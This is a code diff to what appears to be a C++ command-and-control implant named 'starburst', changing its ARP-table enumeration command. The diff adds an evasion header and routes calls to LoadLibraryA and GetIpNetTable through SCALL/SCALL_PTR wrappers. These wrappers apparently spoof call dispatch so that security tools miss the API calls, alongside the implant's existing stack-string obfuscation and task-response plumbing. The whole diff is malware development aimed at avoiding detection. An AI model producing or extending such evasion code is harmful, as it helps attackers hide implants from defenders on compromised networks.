@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_ARP
 
@@ -54,7 +55,7 @@ auto declfn starburst::cmd_arp(
     (void)params;
 
     STK_IPHLPAPI(_n);
-    auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
+    auto h_iphlpapi = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n );
     if ( !h_iphlpapi ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "LoadLibrary iphlpapi failed" ) ) );
@@ -71,7 +72,7 @@ auto declfn starburst::cmd_arp(
     }
 
     ULONG buf_size = 0;
-    pGetIpNetTable( nullptr, &buf_size, FALSE );
+    SCALL_PTR( inst, pGetIpNetTable, nullptr, &buf_size, FALSE );
     if ( buf_size == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
             symbol<char*>( const_cast<char*>( "ARP table empty" ) ) );
@@ -85,7 +86,7 @@ auto declfn starburst::cmd_arp(
         return;
     }
 
-    if ( pGetIpNetTable( table, &buf_size, TRUE ) != 0 ) {
+    if ( (DWORD)SCALL_PTR( inst, pGetIpNetTable, table, &buf_size, TRUE ) != 0 ) {
         inst.heap_free( table );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetIpNetTable failed" ) ) );
